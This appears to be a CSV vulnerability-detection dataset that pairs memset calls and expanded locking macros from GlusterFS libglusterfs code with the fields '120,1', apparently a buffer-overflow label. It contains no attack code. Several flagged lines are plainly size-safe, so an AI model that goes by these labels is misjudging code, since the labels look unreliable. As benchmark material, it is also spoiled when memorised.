2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!locked_on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->inodelk_cbk) tmp_cbk = cluster_inodelk_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->inodelk""; _new->unwind_to = ""cluster_inodelk_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->inodelk_cbk = cluster_inodelk_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->inodelk); subvols[__i]->fops->inodelk (_new, subvols[__i], dom, &loc, 6, &flock, ((void *)0)); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"        flock.l_len = size;

        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!locked_on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->inodelk_cbk) tmp_cbk = cluster_inodelk_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->inodelk""; _new->unwind_to = ""cluster_inodelk_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->inodelk_cbk = cluster_inodelk_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->inodelk); subvols[__i]->fops->inodelk (_new, subvols[__i], dom, &loc, 6, &flock, ((void *)0)); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                                     ;

"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (locked_on, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->inodelk_cbk) tmp_cbk = cluster_inodelk_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->inodelk""; _new->unwind_to = ""cluster_inodelk_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->inodelk_cbk = cluster_inodelk_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->inodelk); subvols[__i]->fops->inodelk (_new, subvols[__i], dom, &loc, 6, &flock, ((void *)0)); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"        loc.inode = inode_ref (inode);
        gf_uuid_copy (loc.gfid, inode->gfid);
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (locked_on, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->inodelk_cbk) tmp_cbk = cluster_inodelk_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->inodelk""; _new->unwind_to = ""cluster_inodelk_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->inodelk_cbk = cluster_inodelk_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->inodelk); subvols[__i]->fops->inodelk (_new, subvols[__i], dom, &loc, 6, &flock, ((void *)0)); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)
                                                ;

"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (locked_on, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->inodelk_cbk) tmp_cbk = cluster_inodelk_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->inodelk""; _new->unwind_to = ""cluster_inodelk_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->inodelk_cbk = cluster_inodelk_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->inodelk); subvols[__i]->fops->inodelk (_new, subvols[__i], dom, &loc, 7, &flock, ((void *)0)); (*__glusterfs_this_location()) = old_THIS; } while (0); syncbarrier_wait (&__local.barrier, 1); } syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                                           replies, output, frame, this, dom, inode, off, size);

                        do { int __i = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (locked_on, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->inodelk_cbk) tmp_cbk = cluster_inodelk_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->inodelk""; _new->unwind_to = ""cluster_inodelk_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->inodelk_cbk = cluster_inodelk_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->inodelk); subvols[__i]->fops->inodelk (_new, subvols[__i], dom, &loc, 7, &flock, ((void *)0)); (*__glusterfs_this_location()) = old_THIS; } while (0); syncbarrier_wait (&__local.barrier, 1); } syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)

                                      ;
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!locked_on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->entrylk_cbk) tmp_cbk = cluster_entrylk_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->entrylk""; _new->unwind_to = ""cluster_entrylk_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->entrylk_cbk = cluster_entrylk_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->entrylk); subvols[__i]->fops->entrylk (_new, subvols[__i], dom, &loc, name, ENTRYLK_UNLOCK, ENTRYLK_WRLCK, ((void *)0)); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"        gf_uuid_copy (loc.gfid, inode->gfid);

        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (output, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!locked_on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->entrylk_cbk) tmp_cbk = cluster_entrylk_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->entrylk""; _new->unwind_to = ""cluster_entrylk_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->entrylk_cbk = cluster_entrylk_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->entrylk); subvols[__i]->fops->entrylk (_new, subvols[__i], dom, &loc, name, ENTRYLK_UNLOCK, ENTRYLK_WRLCK, ((void *)0)); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)

                         ;
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (locked_on, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->entrylk_cbk) tmp_cbk = cluster_entrylk_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->entrylk""; _new->unwind_to = ""cluster_entrylk_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->entrylk_cbk = cluster_entrylk_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->entrylk); subvols[__i]->fops->entrylk (_new, subvols[__i], dom, &loc, name, ENTRYLK_LOCK_NB, ENTRYLK_WRLCK, ((void *)0)); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"        loc.inode = inode_ref (inode);
        gf_uuid_copy (loc.gfid, inode->gfid);
        do { int __i = 0; int __count = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (locked_on, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->entrylk_cbk) tmp_cbk = cluster_entrylk_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->entrylk""; _new->unwind_to = ""cluster_entrylk_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->entrylk_cbk = cluster_entrylk_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->entrylk); subvols[__i]->fops->entrylk (_new, subvols[__i], dom, &loc, name, ENTRYLK_LOCK_NB, ENTRYLK_WRLCK, ((void *)0)); (*__glusterfs_this_location()) = old_THIS; } while (0); __count++; } syncbarrier_wait (&__local.barrier, __count); syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)

                         ;
"
2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\cluster-syncop.cpp.c,"do { int __i = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (locked_on, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->entrylk_cbk) tmp_cbk = cluster_entrylk_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->entrylk""; _new->unwind_to = ""cluster_entrylk_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->entrylk_cbk = cluster_entrylk_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->entrylk); subvols[__i]->fops->entrylk (_new, subvols[__i], dom, &loc, name, ENTRYLK_LOCK, ENTRYLK_WRLCK, ((void *)0)); (*__glusterfs_this_location()) = old_THIS; } while (0); syncbarrier_wait (&__local.barrier, 1); } syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)",120,1,"                                           replies, output, frame, this, dom,
                                           inode, name);
                        do { int __i = 0; cluster_local_t __local = {0,}; void *__old_local = frame->local; __local.replies = replies; memset (locked_on, 0, numsubvols); cluster_replies_wipe (replies, numsubvols); for (__i = 0; __i < numsubvols; __i++) do { (&replies[__i].entries.list)->next = (&replies[__i].entries.list)->prev = &replies[__i].entries.list; } while (0); if (syncbarrier_init (&__local.barrier)) break; frame->local = &__local; for (__i = 0; __i < numsubvols; __i++) { if (!on[__i]) continue; do { call_frame_t *_new = ((void *)0); xlator_t *old_THIS = ((void *)0); _new = mem_get0 (frame->root->pool->frame_mem_pool); if (!_new) { break; } typeof(subvols[__i]->fops->entrylk_cbk) tmp_cbk = cluster_entrylk_cbk; _new->root = frame->root; _new->this = subvols[__i]; _new->ret = (ret_fn_t) tmp_cbk; _new->parent = frame; _new->cookie = (void *)(long) __i; _new->wind_from = __FUNCTION__; _new->wind_to = ""subvols[__i]->fops->entrylk""; _new->unwind_to = ""cluster_entrylk_cbk""; pthread_mutex_init (&_new->lock, 0); pthread_mutex_lock (&frame->root->stack_lock); { list_add (&_new->frames, &frame->root->myframes); frame->ref_count++; } pthread_mutex_unlock (&frame->root->stack_lock); subvols[__i]->fops->entrylk_cbk = cluster_entrylk_cbk; old_THIS = (*__glusterfs_this_location()); (*__glusterfs_this_location()) = subvols[__i]; if (subvols[__i]->ctx->measure_latency) gf_latency_begin (_new, subvols[__i]->fops->entrylk); subvols[__i]->fops->entrylk (_new, subvols[__i], dom, &loc, name, ENTRYLK_LOCK, ENTRYLK_WRLCK, ((void *)0)); (*__glusterfs_this_location()) = old_THIS; } while (0); syncbarrier_wait (&__local.barrier, 1); } syncbarrier_destroy (&__local.barrier); frame->local = __old_local; STACK_RESET (frame->root); } while (0)

                                                                   ;
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"memset(&hints, 0, sizeof(hints));",120,1,"                                                               ;

                memset(&hints, 0, sizeof(hints));
                hints.ai_family = family;
                hints.ai_socktype = SOCK_STREAM;
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"memset (str, 0, len);",120,1,"
        if (new_len != len) {
                memset (str, 0, len);
                strncpy (str, new_str, new_len);
        }
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"memset (&hints, 0, sizeof (hints));",120,1,"        this = (*__glusterfs_this_location());

        memset (&hints, 0, sizeof (hints));


"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"memset (buf+pos, ')', frames);",120,1,"                return;

        memset (buf+pos, ')', frames);
        buf[pos+frames] = '\0';
}
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"memset (hostname, 0, size);",120,1,"                goto out;

        memset (hostname, 0, size);
        i = 0;
        while (++start != end)
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"memset(ptr, 0, mem_pool->real_sizeof_type);",120,1,"
        if (ptr)
                memset(ptr, 0, mem_pool->real_sizeof_type);

        return ptr;
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"memset (buf, 0, 4096);",120,1,"        offset = strlen (key);

        memset (buf, 0, 4096);
        snprintf (buf, 4096, ""%s"", key);
        snprintf (buf + offset, 4096 - offset, ""="");
"
2021\cslim\test\libglusterfs\compat.h,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.h,"extern void *memset (void *__s, int __c, size_t __n) __attribute__ ((__nothrow__ , __leaf__)) __attribute__ ((__nonnull__ (1)));;",120,1,"_gf_msg_nomem (const char *domain, const char *file,;
gf_mem_set_acct_info (xlator_t *xl, char **alloc_ptr, size_t size,;
extern void *memset (void *__s, int __c, size_t __n) __attribute__ ((__nothrow__ , __leaf__)) __attribute__ ((__nonnull__ (1)));;
extern int vsnprintf (char *__restrict __s, size_t __maxlen,;
gf_proc_dump_write_strfd (char *key, char *value, va_list ap);
"
2021\cslim\test\libglusterfs\fd.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\fd.cpp.c,"memset (begin, 0, diff);",120,1,"                        * sizeof (struct _fd_ctx);

                memset (begin, 0, diff);

                fd->xl_count = new_xl_count;
"
2021\cslim\test\libglusterfs\fd.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\fd.cpp.c,"memset(key, 0, sizeof(key));",120,1,"                return;

        memset(key, 0, sizeof(key));
        gf_proc_dump_write(""pid"", ""%llu"", fd->pid);
        gf_proc_dump_write(""refcount"", ""%d"", fd->refcount);
"
2021\cslim\test\libglusterfs\gidcache.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\gidcache.cpp.c,"memset(cache->gc_cache, 0, sizeof(gid_list_t) * (4 * 256));",120,1," cache->gc_max_age = timeout;
 cache->gc_nbuckets = 256;
 memset(cache->gc_cache, 0, sizeof(gid_list_t) * (4 * 256));

 return 0;
"
2021\cslim\test\libglusterfs\inode.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\inode.cpp.c,"memset (root, 0, 16);",120,1,"        uuid_t root;

        memset (root, 0, 16);
        root[15] = 1;

"
2021\cslim\test\libglusterfs\iobuf.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\iobuf.cpp.c,"memset(&my_iobuf, 0, sizeof(my_iobuf));",120,1,"        do { if (!iobuf) { (*__errno_location ()) = 22; do { _gf_msg (""iobuf"", ""./iobuf.c"", __FUNCTION__, 1097, GF_LOG_ERROR, (*__errno_location ()), 1, (100000 + 1000 + 172), ""invalid argument: "" ""iobuf""); } while (0); goto out; } } while (0);

        memset(&my_iobuf, 0, sizeof(my_iobuf));

        ret = pthread_mutex_trylock (&iobuf->lock);
"
2021\cslim\test\libglusterfs\latency.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\latency.cpp.c,"memset (xl->latencies, 0, sizeof (xl->latencies));",120,1,"        }

        memset (xl->latencies, 0, sizeof (xl->latencies));
}

"
2021\cslim\test\libglusterfs\stack.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\stack.cpp.c,"memset(prefix, 0, sizeof(prefix));",120,1,"        do { if (!(key_buf)) { do { _gf_msg ("""", ""./stack.c"", __FUNCTION__, 80, GF_LOG_ERROR, 0, 1, (100000 + 1000 + 150), ""Assertion failed: "" ""key_buf""); } while (0); } } while (0);

        memset(prefix, 0, sizeof(prefix));
        memset(&my_frame, 0, sizeof(my_frame));
        __builtin_va_start(ap,key_buf);
"
2021\cslim\test\libglusterfs\stack.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\stack.cpp.c,"memset(&my_frame, 0, sizeof(my_frame));",120,1,"
        memset(prefix, 0, sizeof(prefix));
        memset(&my_frame, 0, sizeof(my_frame));
        __builtin_va_start(ap,key_buf);
        vsnprintf(prefix, 4096, key_buf, ap);
"
2021\cslim\test\libglusterfs\statedump.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\statedump.cpp.c,"memset (buf, 0, sizeof(buf));",120,1,"        do { if (!(key)) { do { _gf_msg ("""", ""./statedump.c"", __FUNCTION__, 127, GF_LOG_ERROR, 0, 1, (100000 + 1000 + 150), ""Assertion failed: "" ""key""); } while (0); } } while (0);

        memset (buf, 0, sizeof(buf));
        snprintf (buf, 4096, ""\n["");
        vsnprintf (buf + strlen(buf),
"
2021\cslim\test\libglusterfs\statedump.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\statedump.cpp.c,"memset (sign_string, 0, sizeof (sign_string));",120,1,"        ret = sys_write (gf_dump_fd, sign_string, strlen (sign_string));

        memset (sign_string, 0, sizeof (sign_string));
        memset (timestr, 0, sizeof (timestr));
        memset (&tv, 0, sizeof (tv));
"
2021\cslim\test\libglusterfs\statedump.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\statedump.cpp.c,"memset (timestr, 0, sizeof (timestr));",120,1,"
        memset (sign_string, 0, sizeof (sign_string));
        memset (timestr, 0, sizeof (timestr));
        memset (&tv, 0, sizeof (tv));

"
2021\cslim\test\libglusterfs\statedump.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\statedump.cpp.c,"memset (&tv, 0, sizeof (tv));",120,1,"        memset (sign_string, 0, sizeof (sign_string));
        memset (timestr, 0, sizeof (timestr));
        memset (&tv, 0, sizeof (tv));

        if ((dump_options.dump_mem == _gf_true)) {
"
2021\cslim\test\libglusterfs\syncop.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\syncop.cpp.c,"memset (proc, 0, sizeof (*proc));",120,1,"                                task = ((void *)0);
                                env->procs--;
                                memset (proc, 0, sizeof (*proc));
                                pthread_cond_broadcast (&env->cond);
                                goto unlock;
"
